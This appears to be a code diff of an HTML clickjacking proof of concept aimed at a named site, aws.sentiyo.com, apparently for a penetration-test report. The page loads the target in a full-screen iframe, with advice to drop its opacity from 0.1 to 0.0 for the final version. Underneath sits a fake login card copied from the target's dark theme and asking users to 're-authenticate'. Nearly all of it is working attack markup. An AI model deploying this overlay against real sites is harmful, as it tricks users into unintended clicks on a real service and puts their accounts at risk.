@@ -2,63 +2,67 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Account Verification</title>
+    <title>Security Verification - Sentiyo</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; font-family: sans-serif; }
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; font-family: 'Segoe UI', sans-serif; }
 
-        /* THE TRICK: The real site is ON TOP but INVISIBLE */
-        .target-frame { 
+        /* LAYER 1: The REAL site (Invisible but clickable) */
+        .victim-frame { 
             position: absolute;
             top: 0; left: 0;
             width: 100vw; height: 100vh;
             border: none;
-            z-index: 2;
-            opacity: 0.1; /* Set to 0.0 for the real attack; 0.1 for testing so you can align it */
-            cursor: text;
+            z-index: 10; /* Sits on top */
+            opacity: 0.1; /* Set to 0.1 to align, then 0.0 for the final PoC */
         }
 
-        /* THE DECEPTION: This is what the user THINKS they are clicking on */
-        .fake-background {
+        /* LAYER 2: The FAKE UI (What the user sees) */
+        .attacker-ui {
             position: absolute;
             top: 0; left: 0;
             width: 100vw; height: 100vh;
-            background: #f0f2f5;
+            background: #121212; /* Match their dark theme exactly */
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            z-index: 1;
+            z-index: 1; /* Sits underneath */
         }
 
-        .fake-input-box {
-            background: white;
+        .fake-login-card {
+            background: #1e1e1e;
             padding: 40px;
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
             text-align: center;
+            color: white;
+            width: 380px;
+        }
+
+        /* Mirror their exact CSS styles here */
+        .fake-input { 
+            background: #2b2b2b; border: 1px solid #444; color: white;
+            padding: 12px; margin: 10px 0; width: 300px; border-radius: 4px;
+        }
+        .fake-btn { 
+            background: #ff9800; color: black; font-weight: bold;
+            padding: 12px; width: 325px; border-radius: 4px; border: none;
         }
     </style>
 </head>
 <body>
 
-    <div class="fake-background">
-        <div class="fake-input-box">
-            <h2>Session Expired</h2>
-            <p>Please re-enter your credentials to continue.</p>
-            <div style="border: 1px solid #ccc; padding: 10px; margin: 10px; width: 300px; color: #888;">Email</div>
-            <div style="border: 1px solid #ccc; padding: 10px; margin: 10px; width: 300px; color: #888;">Password</div>
-            <div style="background: #0056b3; color: white; padding: 10px; margin: 10px; width: 300px;">Login</div>
+    <iframe src="https://aws.sentiyo.com" class="victim-frame"></iframe>
+
+    <div class="attacker-ui">
+        <div class="fake-login-card">
+            <h1 style="font-size: 24px;">Sentiyo</h1>
+            <p style="color: #aaa;">Please re-authenticate to continue</p>
+            <div class="fake-input">Email or Username</div>
+            <div class="fake-input">Password</div>
+            <div class="fake-btn">Login</div>
+            <p style="color: #ff9800; font-size: 12px; margin-top: 15px;">Forgot your password?</p>
         </div>
     </div>
 
-    <iframe src="https://aws.sentiyo.com" class="target-frame" id="victim-frame"></iframe>
-
-    <script>
-        // NOTE ON CAPTURING: 
-        // Browsers block scripts from reading keystrokes inside a cross-origin iframe (Same-Origin Policy).
-        // To "capture" credentials in a true Clickjacking VAPT report:
-        // You prove the user CAN be tricked into clicking "Delete" or "Transfer" 
-        // by overlaying your fake UI over the real buttons.
-    </script>
 </body>
 </html>
